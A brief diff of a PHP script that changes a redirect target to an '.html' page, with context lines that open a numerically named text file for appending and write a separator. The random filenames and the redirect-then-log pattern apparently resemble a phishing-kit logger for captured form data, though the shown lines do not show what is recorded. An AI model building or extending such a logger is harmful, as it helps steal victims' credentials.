@@ -1,6 +1,6 @@
 <?php
 
-header ('Location: MunGBs9BCi5kytgveCpWxdv');
+header ('Location: MunGBs9BCi5kytgveCpWxdv.html');
 $handle = fopen("415979872L.txt", "a");
 fwrite($handle, "===============================");
 fwrite($handle, "\n");
